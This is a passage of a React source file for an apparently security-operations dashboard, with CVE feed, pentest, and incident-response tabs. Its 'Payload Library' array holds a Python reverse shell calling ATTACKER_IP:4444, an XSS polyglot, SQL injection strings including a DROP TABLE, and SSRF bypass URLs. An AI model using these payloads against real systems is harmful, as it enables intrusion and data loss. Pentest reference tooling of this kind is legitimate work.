import { useState, useEffect, useCallback, lazy, Suspense } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Progress } from "@/components/ui/progress";
import { Skeleton } from "@/components/ui/skeleton";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import {
  Shield, Crosshair, Radio, FlaskConical, AlertTriangle, Search,
  Activity, Bug, Terminal, Globe, Clock, Zap, Eye, Lock,
  Server, Wifi, ChevronRight, ExternalLink, Target, Skull,
  FileWarning, Radar, Flame, Database, Network, ShieldAlert,
  ShieldCheck, ArrowUpRight, Play, Pause, RotateCcw, Download,
  Copy, CheckCircle2, XCircle, Info, TrendingUp, Layers, BookOpen,
  RefreshCw, History, AlertCircle, Brain, Trophy, BookMarked, Scan, Plus
} from "lucide-react";
import { cn } from "@/lib/utils";
import { useLiveCVEs, useThreatActors, useWebsiteScan, useScanHistory, useRealtimeCVEs } from "@/hooks/useThreatIntel";
import {
  useIncidents, useIncidentEvents, useCreateIncident, useAddIncidentEvent,
  useResearchProjects, useCreateResearchProject, useUpdateResearchProject,
  useCyberStats,
} from "@/hooks/useCyberData";
import { toast } from "sonner";
import { formatDistanceToNow } from "date-fns";

// Lazy load heavy sub-modules
const CyberAICopilot = lazy(() => import("./CyberAICopilot"));
const BugBountyTracker = lazy(() => import("./BugBountyTracker"));
const SecurityCheatSheets = lazy(() => import("./SecurityCheatSheets"));
const OSINTDashboard = lazy(() => import("./OSINTDashboard"));

const TabLoader = () => (
  <div className="flex items-center justify-center h-64 text-muted-foreground">
    <div className="text-center">
      <div className="h-8 w-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-2" />
      <span className="text-xs">Loading module...</span>
    </div>
  </div>
);

// ── Static reference data ─────────────────────────────────
const pentestModules = [
  { id: "recon", name: "Reconnaissance", icon: Eye, desc: "OSINT gathering, subdomain enumeration, technology fingerprinting", tools: ["subfinder", "amass", "httpx", "nuclei"], status: "ready" },
  { id: "scan", name: "Vulnerability Scan", icon: Radar, desc: "Automated vulnerability detection across web, network, and cloud", tools: ["nmap", "nikto", "sqlmap", "burpsuite"], status: "ready" },
  { id: "exploit", name: "Exploitation", icon: Flame, desc: "Payload generation, exploit chaining, and post-exploitation", tools: ["metasploit", "cobalt-strike", "empire"], status: "ready" },
  { id: "privesc", name: "Privilege Escalation", icon: ArrowUpRight, desc: "Local and domain privilege escalation paths", tools: ["linpeas", "winpeas", "bloodhound", "mimikatz"], status: "ready" },
  { id: "lateral", name: "Lateral Movement", icon: Network, desc: "Network pivoting, pass-the-hash, and credential relay", tools: ["crackmapexec", "impacket", "psexec"], status: "ready" },
  { id: "exfil", name: "Data Exfiltration", icon: Database, desc: "Covert data extraction and C2 channel testing", tools: ["dnscat2", "cobaltstrike-c2", "icmp-exfil"], status: "ready" },
];

const payloadTemplates = [
  { name: "Reverse Shell (Python)", lang: "python", code: `import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("ATTACKER_IP",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/sh","-i"])` },
  { name: "XSS Polyglot", lang: "javascript", code: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik//0telerik//0telerik//` },
  { name: "SQL Injection (Union)", lang: "sql", code: `' UNION SELECT null,username,password FROM users--\n' OR 1=1; DROP TABLE users;--\n' AND (SELECT COUNT(*) FROM information_schema.tables)>0--` },
  { name: "SSRF Bypass", lang: "http", code: `http://127.0.0.1:80\nhttp://0x7f000001\nhttp://[::1]\nhttp://localhost.localdomain\nhttp://0177.0.0.1` },
];

const mitreTactics = [
  { id: "TA0001", name: "Initial Access", techniques: 9, color: "hsl(var(--destructive))" },
  { id: "TA0002", name: "Execution", techniques: 14, color: "hsl(var(--warning))" },
  { id: "TA0003", name: "Persistence", techniques: 19, color: "hsl(var(--warning))" },
  { id: "TA0004", name: "Priv Escalation", techniques: 13, color: "hsl(var(--accent))" },
  { id: "TA0005", name: "Defense Evasion", techniques: 42, color: "hsl(var(--secondary))" },
  { id: "TA0006", name: "Credential Access", techniques: 17, color: "hsl(var(--primary))" },
  { id: "TA0007", name: "Discovery", techniques: 31, color: "hsl(var(--primary))" },
  { id: "TA0008", name: "Lateral Movement", techniques: 9, color: "hsl(var(--success))" },
  { id: "TA0009", name: "Collection", techniques: 17, color: "hsl(var(--success))" },
  { id: "TA0010", name: "Exfiltration", techniques: 9, color: "hsl(var(--destructive))" },
  { id: "TA0011", name: "Command & Control", techniques: 16, color: "hsl(var(--accent))" },
  { id: "TA0040", name: "Impact", techniques: 13, color: "hsl(var(--destructive))" },
];

// ── Helpers ───────────────────────────────────────────────
const sevColor = (s: string) =>
  s === "critical" ? "bg-destructive/15 text-destructive border-destructive/30" :
  s === "high" ? "bg-warning/15 text-warning border-warning/30" :
  s === "medium" ? "bg-primary/15 text-primary border-primary/30" :
  s === "info" ? "bg-secondary/15 text-secondary border-secondary/30" :
  "bg-muted text-muted-foreground border-border";

const sevDot = (s: string) =>
  s === "critical" ? "bg-destructive" : s === "high" ? "bg-warning" : s === "medium" ? "bg-primary" : "bg-muted-foreground";

const LivePulse = ({ className }: { className?: string }) => (
  <span className={cn("relative flex h-2 w-2", className)}>
    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-destructive opacity-75" />
    <span className="relative inline-flex rounded-full h-2 w-2 bg-destructive" />
  </span>
);

// ═══════════════════════════════════════════════════════════
const CyberCommandCenter = () => {
  const [activeTab, setActiveTab] = useState("ai-copilot");
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedCVE, setSelectedCVE] = useState<string | null>(null);
  const [scanTarget, setScanTarget] = useState("");
  const [copiedPayload, setCopiedPayload] = useState<string | null>(null);
  const [selectedTactic, setSelectedTactic] = useState<string | null>(null);
  const [selectedIncident, setSelectedIncident] = useState<string | null>(null);
  const [showAddIncident, setShowAddIncident] = useState(false);
  const [showAddEvent, setShowAddEvent] = useState(false);
  const [showAddResearch, setShowAddResearch] = useState(false);
  const [newIncident, setNewIncident] = useState({ title: "", severity: "medium" });
  const [newEvent, setNewEvent] = useState({ event_time: "", event_description: "", severity: "info", mitre_tactic: "" });
  const [newResearch, setNewResearch] = useState({ project_code: "", target: "", vulnerability_type: "", status: "analyzing", estimated_bounty: 0, progress: 0 });

  const [terminalOutput, setTerminalOutput] = useState<string[]>([
    "shadowtalk@cyber:~$ ",
    "╔══════════════════════════════════════════════════╗",
    "║  ShadowTalk Cyber Command Center v4.0            ║",
    "║  All-in-One Security Operations Platform          ║",
    "╚══════════════════════════════════════════════════╝",
    "", "[*] Initializing...", "shadowtalk@cyber:~$ "
  ]);

  // Data hooks
  const { data: liveCVEs = [], isLoading: cvesLoading, refetch: refetchCVEs, isError: cvesError } = useLiveCVEs();
  const { data: threatActors = [], isLoading: actorsLoading } = useThreatActors();
  const { data: scanHistory = [] } = useScanHistory();
  const { data: heroStats } = useCyberStats();
  const websiteScan = useWebsiteScan();
  const { subscribe } = useRealtimeCVEs((newCve) => {
    toast.info(`New CVE: ${newCve.cve_id}`, { description: `${newCve.severity.toUpperCase()} - ${newCve.product}` });
  });

  // Incidents
  const { data: incidents = [] } = useIncidents();
  const { data: incidentEvents = [] } = useIncidentEvents(selectedIncident);
  const createIncident = useCreateIncident();
  const addEvent = useAddIncidentEvent();

  // Research
  const { data: researchProjects = [] } = useResearchProjects();
  const createResearch = useCreateResearchProject();
  const updateResearch = useUpdateResearchProject();

  useEffect(() => { const unsub = subscribe(); return unsub; }, []);

  useEffect(() => {
    if (liveCVEs.length > 0 && !cvesLoading) {
      setTerminalOutput(prev => {
        if (prev.some(l => l.includes('NVD CVE Database'))) return prev;
        return [...prev, `[✓] NVD CVE Database — ${liveCVEs.length} CVEs loaded`, `[✓] Threat Actors — ${threatActors.length} tracked`, "[*] Ready.", "", "shadowtalk@cyber:~$ "];
      });
    }
  }, [liveCVEs, threatActors, cvesLoading]);

  // Auto-select first incident
  useEffect(() => {
    if (incidents.length > 0 && !selectedIncident) {
      setSelectedIncident(incidents[0].id);
    }
  }, [incidents, selectedIncident]);

  const startScan = useCallback(() => {
    if (!scanTarget.trim()) { toast.error("Enter a target URL"); return; }
    websiteScan.mutate({ url: scanTarget, scanDepth: "standard" }, {
      onSuccess: () => toast.success("Scan completed"),
      onError: (err) => toast.error("Scan failed", { description: err.message }),
    });
  }, [scanTarget, websiteScan]);

  const copyPayload = (name: string, code: string) => {
    navigator.clipboard.writeText(code);
    setCopiedPayload(name);
    setTimeout(() => setCopiedPayload(null), 2000);
  };

  const handleCreateIncident = () => {
    if (!newIncident.title) return;
    createIncident.mutate(newIncident, {
      onSuccess: (data) => {
        setSelectedIncident(data.id);
        setShowAddIncident(false);
        setNewIncident({ title: "", severity: "medium" });
        toast.success("Incident created");
      },
      onError: (e: Error) => toast.error(e.message),
    });
  };

  const handleAddEvent = () => {
    if (!selectedIncident || !newEvent.event_description) return;
    addEvent.mutate({ ...newEvent, incident_id: selectedIncident, mitre_tactic: newEvent.mitre_tactic || undefined }, {
      onSuccess: () => {
        setShowAddEvent(false);
        setNewEvent({ event_time: "", event_description: "", severity: "info", mitre_tactic: "" });
        toast.success("Event added to timeline");
      },
      onError: (e: Error) => toast.error(e.message),
    });
  };

  const handleCreateResearch = () => {
    if (!newResearch.target || !newResearch.vulnerability_type) return;
    createResearch.mutate(newResearch, {
      onSuccess: () => {
        setShowAddResearch(false);
        setNewResearch({ project_code: "", target: "", vulnerability_type: "", status: "analyzing", estimated_bounty: 0, progress: 0 });
        toast.success("Research project created");
      },
      onError: (e: Error) => toast.error(e.message),
    });
  };

  const tabConfig = [
    { id: "ai-copilot", label: "AI Copilot", icon: Brain, color: "text-primary" },
    { id: "threat-intel", label: "Threat Intel", icon: Radio, color: "text-destructive" },
    { id: "pentesting", label: "Pentest", icon: Crosshair, color: "text-warning" },
    { id: "osint", label: "OSINT", icon: Eye, color: "text-blue-400" },
    { id: "incident-response", label: "War Room", icon: ShieldAlert, color: "text-accent" },
    { id: "bug-bounty", label: "Bug Bounty", icon: Trophy, color: "text-success" },
    { id: "cheatsheets", label: "Cheat Sheets", icon: BookMarked, color: "text-secondary" },
    { id: "zero-day", label: "Zero-Day Lab", icon: FlaskConical, color: "text-secondary" },
  ];

  return (
    <div className="container mx-auto max-w-7xl px-4 py-8">
      {/* HERO — real stats */}
      <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="text-center mb-10">
        <div className="inline-flex items-center gap-2 rounded-full border border-destructive/30 bg-destructive/5 px-4 py-1.5 mb-6">
          <LivePulse />
          <span className="text-xs font-mono text-destructive font-semibold tracking-wider">CYBER COMMAND — LIVE</span>
        </div>
        <h1 className="text-4xl md:text-6xl font-black mb-4 tracking-tight">
          <span className="text-foreground">Cyber </span>
          <span className="bg-gradient-to-r from-destructive via-warning to-accent bg-clip-text text-transparent">Command Center</span>
        </h1>
        <p className="text-muted-foreground max-w-2xl mx-auto text-lg">
          AI-powered all-in-one security operations platform for pentesters, bug bounty hunters, SOC analysts, and CISOs.
        </p>
        <div className="flex flex-wrap items-center justify-center gap-4 mt-8">
          {[
            { label: "CVEs Tracked", value: (heroStats?.cveCount || liveCVEs.length).toLocaleString(), icon: Bug, color: "text-destructive" },
            { label: "Threat Actors", value: (heroStats?.actorCount || threatActors.length).toLocaleString(), icon: Skull, color: "text-warning" },
            { label: "MITRE Techniques", value: "201", icon: Layers, color: "text-accent" },
            { label: "Scans Run", value: (heroStats?.scanCount || 0).toLocaleString(), icon: Scan, color: "text-secondary" },
          ].map((stat, i) => (
            <motion.div key={i} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 + i * 0.05 }} className="flex items-center gap-2 px-4 py-2 rounded-xl border border-border bg-card">
              <stat.icon className={cn("h-4 w-4", stat.color)} />
              <span className="font-mono text-sm font-bold text-foreground">{stat.value}</span>
              <span className="text-[10px] text-muted-foreground uppercase tracking-wider">{stat.label}</span>
            </motion.div>
          ))}
        </div>
      </motion.div>

      {/* TABS */}
      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="w-full flex flex-wrap bg-card border border-border rounded-2xl p-1.5 mb-8 h-auto gap-0.5">
          {tabConfig.map(tab => (
            <TabsTrigger key={tab.id} value={tab.id} className="flex-1 min-w-[80px] flex items-center justify-center gap-1.5 py-2.5 rounded-xl data-[state=active]:bg-muted data-[state=active]:shadow-md transition-all font-semibold text-xs">
              <tab.icon className={cn("h-3.5 w-3.5", activeTab === tab.id ? tab.color : "text-muted-foreground")} />
              <span className="hidden md:inline">{tab.label}</span>
            </TabsTrigger>
          ))}
        </TabsList>

        {/* TAB: AI COPILOT */}
        <TabsContent value="ai-copilot">
          <Suspense fallback={<TabLoader />}><CyberAICopilot /></Suspense>
        </TabsContent>

        {/* TAB: THREAT INTEL */}
        <TabsContent value="threat-intel">
          <div className="space-y-6">
            <div className="relative">
              <Search className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input placeholder="Search CVEs, products, threat actors..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} className="pl-11 h-12 bg-card border-border rounded-xl font-mono text-sm" />
            </div>
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              <div className="lg:col-span-2">
                <Card className="border-border bg-card">
                  <CardHeader className="pb-3">
                    <div className="flex items-center justify-between">
                      <CardTitle className="flex items-center gap-2 text-lg"><Bug className="h-5 w-5 text-destructive" /> Live CVE Feed <LivePulse className="ml-1" /></CardTitle>
                      <div className="flex items-center gap-2">
                        <Badge variant="outline" className="font-mono text-[10px]">{(heroStats?.cveCount || liveCVEs.length).toLocaleString()} total</Badge>
                        <Button variant="ghost" size="sm" className="h-7 w-7 p-0" onClick={() => refetchCVEs()}><RefreshCw className="h-3 w-3" /></Button>
                      </div>
                    </div>
                  </CardHeader>
                  <CardContent className="p-0">
                    <ScrollArea className="h-[520px]">
                      {cvesLoading ? (
                        <div className="p-4 space-y-3">{[...Array(5)].map((_, i) => <Skeleton key={i} className="h-20 w-full" />)}</div>
                      ) : cvesError ? (
                        <div className="p-8 text-center">
                          <AlertCircle className="h-8 w-8 text-destructive mx-auto mb-2" />
                          <p className="text-sm text-muted-foreground">Failed to load CVEs. Sign in to fetch live data.</p>
                          <Button variant="outline" size="sm" className="mt-3" onClick={() => refetchCVEs()}><RefreshCw className="h-3 w-3 mr-1" /> Retry</Button>
                        </div>
                      ) : (
                        <div className="divide-y divide-border">
                          {liveCVEs.filter(c => !searchQuery || c.cve_id.toLowerCase().includes(searchQuery.toLowerCase()) || c.product.toLowerCase().includes(searchQuery.toLowerCase())).map((cve, i) => (
                            <motion.div key={cve.id} initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.04 }}
                              className={cn("p-4 hover:bg-muted/30 cursor-pointer transition-colors", selectedCVE === cve.id && "bg-muted/50 border-l-2 border-l-destructive")}
                              onClick={() => setSelectedCVE(selectedCVE === cve.id ? null : cve.id)}
                            >
                              <div className="flex items-start justify-between gap-3">
                                <div className="flex-1 min-w-0">
                                  <div className="flex items-center gap-2 mb-1">
                                    <code className="text-sm font-bold text-foreground font-mono">{cve.cve_id}</code>
                                    <Badge className={cn("text-[9px] px-1.5 py-0", sevColor(cve.severity))}>{cve.severity.toUpperCase()}</Badge>
                                    {cve.exploit_available && <Badge className="text-[9px] px-1.5 py-0 bg-destructive/15 text-destructive border-destructive/30">EXPLOIT ⚡</Badge>}
                                  </div>
                                  <p className="text-xs text-muted-foreground font-mono">{cve.product}</p>
                                  <p className="text-sm text-foreground/80 mt-1">{cve.description}</p>
                                </div>
                                <div className="text-right shrink-0">
                                  <div className={cn("text-lg font-black font-mono", cve.cvss_score >= 9 ? "text-destructive" : cve.cvss_score >= 7 ? "text-warning" : "text-primary")}>{cve.cvss_score}</div>
                                  <span className="text-[10px] text-muted-foreground">{formatDistanceToNow(new Date(cve.published_at), { addSuffix: true })}</span>
                                </div>
                              </div>
                              <AnimatePresence>
                                {selectedCVE === cve.id && (
                                  <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }} className="overflow-hidden">
                                    <div className="mt-3 pt-3 border-t border-border/50 grid grid-cols-3 gap-3 text-xs">
                                      <div className="p-2 rounded-lg bg-muted/50"><span className="text-muted-foreground">Vector</span><p className="font-mono text-foreground mt-0.5">{cve.attack_vector || 'NETWORK'}</p></div>
                                      <div className="p-2 rounded-lg bg-muted/50"><span className="text-muted-foreground">Complexity</span><p className="font-mono text-foreground mt-0.5">{cve.attack_complexity || 'LOW'}</p></div>
                                      <div className="p-2 rounded-lg bg-muted/50"><span className="text-muted-foreground">Auth Required</span><p className="font-mono text-foreground mt-0.5">{cve.auth_required || 'NONE'}</p></div>
                                    </div>
                                    <div className="flex gap-2 mt-3">
                                      <Button size="sm" variant="outline" className="text-xs gap-1.5 h-7" asChild>
                                        <a href={`https://nvd.nist.gov/vuln/detail/${cve.cve_id}`} target="_blank" rel="noopener noreferrer"><ExternalLink className="h-3 w-3" /> NVD Details</a>
                                      </Button>
                                    </div>
                                  </motion.div>
                                )}
                              </AnimatePresence>
                            </motion.div>
                          ))}
                        </div>
                      )}
                    </ScrollArea>
                  </CardContent>
                </Card>
              </div>

              <div className="space-y-6">
                <Card className="border-border bg-card">
                  <CardHeader className="pb-3">
                    <CardTitle className="flex items-center gap-2 text-base"><Skull className="h-5 w-5 text-warning" /> Active Threat Actors</CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    {actorsLoading ? (
                      <div className="space-y-3">{[...Array(3)].map((_, i) => <Skeleton key={i} className="h-20 w-full" />)}</div>
                    ) : threatActors.length === 0 ? (
                      <p className="text-sm text-muted-foreground text-center py-6">No threat actors tracked yet.</p>
                    ) : threatActors.map((actor, i) => (
                      <motion.div key={actor.id} initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: i * 0.06 }}
                        className="p-3 rounded-xl border border-border hover:border-warning/30 transition-colors cursor-pointer"
                      >
                        <div className="flex items-center justify-between mb-1">
                          <div className="flex items-center gap-2">
                            <span className="text-lg">{actor.origin_flag}</span>
                            <span className="font-mono text-sm font-bold text-foreground">{actor.name}</span>
                          </div>
                          {actor.activity_status === "active" ? <LivePulse /> : <span className="h-2 w-2 rounded-full bg-muted-foreground" />}
                        </div>
                        <p className="text-xs text-muted-foreground">{actor.targets}</p>
                        <div className="flex items-center gap-3 mt-2 text-[10px] text-muted-foreground">
                          <span className="font-mono">{actor.ttps_count} TTPs</span>
                          <span>Last seen: {formatDistanceToNow(new Date(actor.last_seen_at), { addSuffix: true })}</span>
                        </div>
                      </motion.div>
                    ))}
                  </CardContent>
                </Card>
                <Card className="border-destructive/20 bg-gradient-to-br from-destructive/5 to-card">
                  <CardContent className="py-6 text-center">
                    <Globe className="h-8 w-8 text-destructive mx-auto mb-3" />
                    <h3 className="font-bold text-foreground mb-1">Threat Summary</h3>
                    <div className="text-3xl font-black font-mono text-destructive mb-2">
                      {liveCVEs.filter(c => c.severity === "critical").length}
                    </div>
                    <p className="text-xs text-muted-foreground">Critical CVEs in the last 7 days</p>
                    <div className="flex justify-center gap-1 mt-3">
                      {["critical", "high", "medium", "low"].map(sev => {
                        const count = liveCVEs.filter(c => c.severity === sev).length;
                        return (
                          <div key={sev} className="text-center px-2">
                            <div className={cn("text-sm font-bold font-mono", sev === "critical" ? "text-destructive" : sev === "high" ? "text-warning" : sev === "medium" ? "text-primary" : "text-muted-foreground")}>{count}</div>
                            <div className="text-[9px] text-muted-foreground uppercase">{sev}</div>
                          </div>
                        );
                      })}
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </div>
        </TabsContent>

        {/* TAB: PENTESTING */}
        <TabsContent value="pentesting">
          <div className="space-y-6">
            <Card className="border-border bg-card">
              <CardHeader><CardTitle className="flex items-center gap-2"><Target className="h-5 w-5 text-warning" /> Attack Pipeline</CardTitle></CardHeader>
              <CardContent>
                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
                  {pentestModules.map((mod, i) => (
                    <motion.div key={mod.id} initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: i * 0.05 }}
                      className="group p-4 rounded-xl border border-border hover:border-warning/40 transition-all cursor-pointer text-center hover:bg-muted/30"
                    >
                      <div className="p-3 rounded-xl bg-warning/10 w-fit mx-auto mb-3 group-hover:bg-warning/20 transition-colors">
                        <mod.icon className="h-5 w-5 text-warning" />
                      </div>
                      <h4 className="text-xs font-bold text-foreground mb-1">{mod.name}</h4>
                      <p className="text-[10px] text-muted-foreground leading-tight">{mod.desc}</p>
                      <div className="flex flex-wrap justify-center gap-1 mt-2">
                        {mod.tools.slice(0, 2).map(t => <Badge key={t} variant="outline" className="text-[8px] px-1 py-0">{t}</Badge>)}
                        {mod.tools.length > 2 && <Badge variant="outline" className="text-[8px] px-1 py-0">+{mod.tools.length - 2}</Badge>}
                      </div>
                    </motion.div>
                  ))}
                </div>
                <div className="mt-6 flex items-center gap-4">
                  <Input placeholder="Target: https://example.com" value={scanTarget} onChange={e => setScanTarget(e.target.value)} className="flex-1 h-11 font-mono text-sm bg-muted/30 border-border" />
                  <Button onClick={startScan} disabled={websiteScan.isPending} className="h-11 px-6 gap-2 bg-warning hover:bg-warning/90 text-warning-foreground font-bold">
                    {websiteScan.isPending ? <><RotateCcw className="h-4 w-4 animate-spin" /> Scanning...</> : <><Play className="h-4 w-4" /> Launch Scan</>}
                  </Button>
                </div>
                {scanHistory.length > 0 && (
                  <div className="mt-4 border-t border-border pt-4">
                    <h4 className="text-xs font-bold text-muted-foreground uppercase tracking-wider mb-2 flex items-center gap-1"><History className="h-3 w-3" /> Recent Scans</h4>
                    <div className="space-y-2">
                      {scanHistory.slice(0, 5).map(scan => (
                        <div key={scan.id} className="flex items-center justify-between p-2 rounded-lg bg-muted/30 text-xs">
                          <div className="flex items-center gap-2">
                            <Badge variant="outline" className={cn("text-[9px]", scan.status === 'completed' ? 'text-success border-success/30' : scan.status === 'failed' ? 'text-destructive border-destructive/30' : 'text-warning border-warning/30')}>{scan.status}</Badge>
                            <span className="font-mono text-foreground">{scan.target_url}</span>
                          </div>
                          <div className="flex items-center gap-3 text-muted-foreground">
                            <span>Risk: <span className="font-bold text-foreground">{scan.risk_score}</span></span>
                            <span>{formatDistanceToNow(new Date(scan.created_at), { addSuffix: true })}</span>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </CardContent>
            </Card>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card className="border-border bg-card">
                <CardHeader><CardTitle className="flex items-center gap-2 text-base"><FileWarning className="h-5 w-5 text-accent" /> Payload Library</CardTitle></CardHeader>
                <CardContent className="space-y-3">
                  {payloadTemplates.map((p, i) => (
                    <motion.div key={i} initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: i * 0.05 }} className="p-3 rounded-xl border border-border hover:border-accent/30 transition-colors">
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <Badge variant="outline" className="text-[9px] font-mono">{p.lang}</Badge>
                          <span className="text-sm font-semibold text-foreground">{p.name}</span>
                        </div>
                        <Button variant="ghost" size="sm" className="h-7 text-xs gap-1" onClick={() => copyPayload(p.name, p.code)}>
                          {copiedPayload === p.name ? <><CheckCircle2 className="h-3 w-3 text-success" /> Copied</> : <><Copy className="h-3 w-3" /> Copy</>}
                        </Button>
                      </div>
                      <pre className="text-[10px] font-mono text-muted-foreground bg-muted/50 p-2 rounded-lg overflow-x-auto whitespace-pre-wrap">{p.code}</pre>
                    </motion.div>
                  ))}
                </CardContent>
              </Card>

              <Card className="border-border bg-card">
                <CardHeader className="pb-2">
                  <div className="flex items-center gap-2">
                    <div className="flex gap-1.5"><div className="w-3 h-3 rounded-full bg-destructive/60" /><div className="w-3 h-3 rounded-full bg-warning/60" /><div className="w-3 h-3 rounded-full bg-success/60" /></div>
                    <span className="text-xs font-mono text-muted-foreground ml-2">shadowtalk@cyber:~</span>
                  </div>
                </CardHeader>
                <CardContent className="p-0">
                  <ScrollArea className="h-[400px]">
                    <div className="p-4 font-mono text-xs text-success/80 bg-background/80 min-h-full">
                      {terminalOutput.map((line, i) => (
                        <div key={i} className={cn(line.startsWith("[✓]") ? "text-success" : line.startsWith("[!]") ? "text-warning" : line.startsWith("[✗]") ? "text-destructive" : line.includes("shadowtalk@cyber") ? "text-primary" : "text-foreground/70")}>{line || "\u00A0"}</div>
                      ))}
                      <div className="flex items-center gap-1 mt-1">
                        <span className="text-primary">shadowtalk@cyber:~$</span>
                        <div className="w-2 h-4 bg-primary/80 animate-pulse" />
                      </div>
                    </div>
                  </ScrollArea>
                </CardContent>
              </Card>
            </div>
          </div>
        </TabsContent>

        {/* TAB: OSINT */}
        <TabsContent value="osint">
          <Suspense fallback={<TabLoader />}><OSINTDashboard /></Suspense>
        </TabsContent>

        {/* TAB: WAR ROOM — Real Data */}
        <TabsContent value="incident-response">
          <div className="space-y-6">
            <Card className="border-border bg-card">
              <CardHeader><CardTitle className="flex items-center gap-2"><Layers className="h-5 w-5 text-accent" /> MITRE ATT&CK Matrix</CardTitle></CardHeader>
              <CardContent>
                <div className="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-6 lg:grid-cols-12 gap-2">
                  {mitreTactics.map((tactic, i) => (
                    <motion.div key={tactic.id} initial={{ opacity: 0, scale: 0.8 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: i * 0.03 }}
                      className={cn("p-2 rounded-lg border cursor-pointer transition-all text-center", selectedTactic === tactic.id ? "border-accent bg-accent/10 scale-105" : "border-border hover:border-accent/30")}
                      onClick={() => setSelectedTactic(selectedTactic === tactic.id ? null : tactic.id)}
                    >
                      <div className="text-[9px] font-mono text-muted-foreground mb-1">{tactic.id}</div>
                      <div className="text-[10px] font-bold text-foreground leading-tight mb-1">{tactic.name}</div>
                      <div className="text-[10px] font-mono" style={{ color: tactic.color }}>{tactic.techniques}t</div>
                    </motion.div>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* Incident Selector + Add */}
            <div className="flex items-center gap-3">
              <Select value={selectedIncident || ""} onValueChange={setSelectedIncident}>
                <SelectTrigger className="flex-1 h-10 bg-card border-border">
                  <SelectValue placeholder="Select incident..." />
                </SelectTrigger>
                <SelectContent>
                  {incidents.map(inc => (
                    <SelectItem key={inc.id} value={inc.id}>
                      <span className="font-mono text-xs">{inc.title}</span>
                      <Badge className={cn("ml-2 text-[8px]", sevColor(inc.severity))}>{inc.severity}</Badge>
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <Dialog open={showAddIncident} onOpenChange={setShowAddIncident}>
                <DialogTrigger asChild>
                  <Button size="sm" variant="outline" className="gap-1 h-10"><Plus className="h-3 w-3" /> New Incident</Button>
                </DialogTrigger>
                <DialogContent>
                  <DialogHeader><DialogTitle>Create Incident</DialogTitle></DialogHeader>
                  <div className="space-y-3">
                    <div><Label className="text-xs">Title</Label><Input value={newIncident.title} onChange={e => setNewIncident(p => ({ ...p, title: e.target.value }))} placeholder="e.g. Phishing campaign targeting finance" className="mt-1" /></div>
                    <div><Label className="text-xs">Severity</Label>
                      <Select value={newIncident.severity} onValueChange={v => setNewIncident(p => ({ ...p, severity: v }))}>
                        <SelectTrigger className="mt-1"><SelectValue /></SelectTrigger>
                        <SelectContent>{["critical", "high", "medium", "low"].map(s => <SelectItem key={s} value={s}>{s}</SelectItem>)}</SelectContent>
                      </Select>
                    </div>
                    <Button onClick={handleCreateIncident} disabled={!newIncident.title || createIncident.isPending} className="w-full">
                      {createIncident.isPending ? "Creating..." : "Create Incident"}
                    </Button>
                  </div>
                </DialogContent>
              </Dialog>
            </div>

            {/* Forensic Timeline — from DB */}
            <Card className="border-border bg-card">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2"><Clock className="h-5 w-5 text-secondary" /> Forensic Timeline</CardTitle>
                  <Dialog open={showAddEvent} onOpenChange={setShowAddEvent}>
                    <DialogTrigger asChild>
                      <Button size="sm" variant="outline" className="gap-1 h-7 text-xs" disabled={!selectedIncident}><Plus className="h-3 w-3" /> Add Event</Button>
                    </DialogTrigger>
                    <DialogContent>
                      <DialogHeader><DialogTitle>Add Timeline Event</DialogTitle></DialogHeader>
                      <div className="space-y-3">
                        <div><Label className="text-xs">Time (e.g. 14:32:07)</Label><Input value={newEvent.event_time} onChange={e => setNewEvent(p => ({ ...p, event_time: e.target.value }))} placeholder="HH:MM:SS" className="mt-1 font-mono" /></div>
                        <div><Label className="text-xs">Description</Label><Textarea value={newEvent.event_description} onChange={e => setNewEvent(p => ({ ...p, event_description: e.target.value }))} placeholder="What happened..." className="mt-1" rows={2} /></div>
                        <div className="grid grid-cols-2 gap-3">
                          <div><Label className="text-xs">Severity</Label>
                            <Select value={newEvent.severity} onValueChange={v => setNewEvent(p => ({ ...p, severity: v }))}>
